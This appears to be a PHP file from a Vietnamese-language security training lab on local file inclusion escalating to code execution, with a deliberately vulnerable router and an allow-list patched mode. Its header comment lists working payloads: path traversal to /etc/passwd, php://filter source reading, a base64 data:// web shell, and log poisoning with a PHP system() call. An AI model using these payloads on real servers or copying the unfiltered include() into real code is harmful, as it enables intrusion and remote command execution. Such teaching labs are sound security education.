<?php
/*
 * LAB 3 - LOCAL FILE INCLUSION -> RCE (CWE-98, OWASP A03, ATT&CK T1190)
 * ---------------------------------------------------------------------
 * Kịch bản: router trang "?page=home" include file theo tham số người dùng.
 * LỖI: include() biến chưa kiểm soát -> đọc file nhạy cảm & chạy mã PHP -> RCE.
 *
 * ĐỌC FILE (LFI cơ bản):
 *   ?page=../../../../etc/passwd
 *   ?page=../../../../etc/passwd%00      (null byte - chỉ PHP < 5.3.4)
 *
 * LFI -> RCE, các kỹ thuật:
 *   1) php://filter đọc source (lộ code/secret):
 *        ?page=php://filter/convert.base64-encode/resource=/var/www/html/login.php
 *   2) data:// wrapper (cần allow_url_include=On):
 *        ?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+&c=id
 *   3) php://input (POST body là mã php; cần allow_url_include=On)
 *   4) Log poisoning (luôn dùng được, không cần allow_url_include):
 *        - Gửi request với User-Agent: <?php system($_GET['c']); ?>
 *        - Rồi: ?page=/var/log/apache2/access.log&c=id
 *   5) php_filter_chain -> RCE (tạo payload bằng công cụ php_filter_chain_generator)
 *   6) Session/upload/EXIF poisoning tuỳ môi trường.
 *
 * CÁCH VÁ (nhánh 'safe'):
 *   - Allow-list trang hợp lệ (basename + mảng cho phép), KHÔNG nối path tự do.
 *   - Cấm wrapper (php://, data://, http://). allow_url_include=Off.
 *   - realpath() + kiểm tra prefix thư mục.
 */

$mode = $_GET['mode'] ?? 'vuln';
// vuln: mặc định trỏ tới pages/home.php (include thẳng, KHÔNG tự thêm .php
//        -> giữ nguyên cho các wrapper data://, php://filter, log poisoning)
$page = $_GET['page'] ?? ($mode === 'safe' ? 'home' : 'pages/home.php');
$base = __DIR__ . '/pages';
?>
<!DOCTYPE html><html lang="vi"><head><meta charset="UTF-8"><title>LFI</title>
<style>body{font-family:Arial;max-width:760px;margin:30px auto}pre{background:#f0f0f0;padding:10px;overflow:auto}</style></head><body>
<h2>Lab 3 — Router trang (LFI)</h2>
<p>Chế độ: <b><?= htmlspecialchars($mode) ?></b> — <a href="?mode=vuln&page=pages/home.php">vuln</a> | <a href="?mode=safe&page=home">safe</a></p>
<?php $pfx = ($mode === 'safe') ? '' : 'pages/'; $sfx = ($mode === 'safe') ? '' : '.php'; ?>
<p>Trang: <a href="?mode=<?= htmlspecialchars($mode) ?>&page=<?= $pfx ?>home<?= $sfx ?>">home</a> ·
          <a href="?mode=<?= htmlspecialchars($mode) ?>&page=<?= $pfx ?>about<?= $sfx ?>">about</a></p>
<hr>
<?php
if ($mode === 'safe') {
    // --- Bản vá: allow-list ---
    $allowed = ['home', 'about'];
    $key = basename($page);
    if (in_array($key, $allowed, true)) {
        include "$base/$key.php";
    } else {
        echo "Trang không tồn tại.";
    }
} else {
    // === LỖI CỐ Ý: include thẳng tham số người dùng ===
    include $page;   // không lọc, không ép đuôi -> wrapper & path traversal đều chạy
}
?>
<hr><p><a href="index.php">&larr; Menu</a></p>
</body></html>
